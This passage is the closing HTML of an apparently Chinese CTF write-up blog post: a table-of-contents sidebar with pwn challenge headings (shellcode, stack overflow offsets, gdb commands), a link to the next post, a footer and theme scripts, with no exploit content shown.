class="top-box-text">pwn64(mmap函数)</span></a></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#pwn65-%E6%B1%87%E7%BC%96%E5%88%86%E6%9E%90-%E5%8F%AF%E8%A7%81%E5%AD%97%E7%AC%A6shellcode"><span class="top-box-text">pwn65(汇编分析&amp;可见字符shellcode)</span></a></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#pwn66-shellcode%E5%88%A4%E6%96%AD%E9%80%BB%E8%BE%91%E7%BB%95%E8%BF%87"><span class="top-box-text">pwn66(shellcode判断逻辑绕过)</span></a></li></ol></li><li class="top-box-item top-box-level-1"><a class="top-box-link" href="#NSSCTF"><span class="top-box-text">NSSCTF</span></a><ol class="top-box-child"><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-nc%E7%AD%BE%E5%88%B0%EF%BC%88%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BF%87%E6%BB%A4%EF%BC%89"><span class="top-box-text">[SWPUCTF 2021 新生赛]nc签到（字符串过滤）</span></a></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-gift-pwn%EF%BC%88%E6%A0%88%E6%BA%A2%E5%87%BA%E6%9F%A5%E7%9C%8B%E5%81%8F%E7%A7%BB%EF%BC%89"><span class="top-box-text">[SWPUCTF 2021 新生赛]gift_pwn（栈溢出查看偏移）</span></a><ol class="top-box-child"><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#gdb%E6%9F%A5%E7%9C%8B%E5%86%85%E5%AD%98%E5%91%BD%E4%BB%A4"><span class="top-box-text">gdb查看内存命令</span></a></li></ol></li></ol></li></ol>
        </div>
      </div>
    </div>

    
      <div class="next-post">
        <a class="purple-link" href="/2023/07/23/%E6%95%B0%E8%AE%BA%E5%92%8C%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%E5%9F%BA%E7%A1%80/">
          <h3 class="post-title">
            下一篇：数论和抽象代数基础
          </h3>
        </a>
      </div>
    
  </div>










<footer>
<div class="site-footer">
  <div class="social-container">
    
      
        <a aria-label="跳转至github" href="https://github.com/Kidder1" target="_blank">
          <i class="icon icon-github"></i>
        </a>
      
    
      
    
      
    
      
    
      
    
  </div>
  
  
  
  
  
    
      <a href="https://beian.miit.gov.cn" target="_blank">陕ICP备2022004010号-1</a>
  
  
</div>
</footer>


      </div>
    </div>
    
<script id="hexo-configurations"> window.theme_config = {"image":{"lazyload_enable":true,"photo_zoom":"simple-lightbox"}}; window.is_post = true; </script>

<script src="/js/main.js"></script>






  <script src="/js/simple-lightbox.min.js"></script><script>document.addEventListener('DOMContentLoaded', function() {new SimpleLightbox('.post-detail .simple-lightbox', {fileExt: false,captionsData:'alt'});});</script></body>
</html>

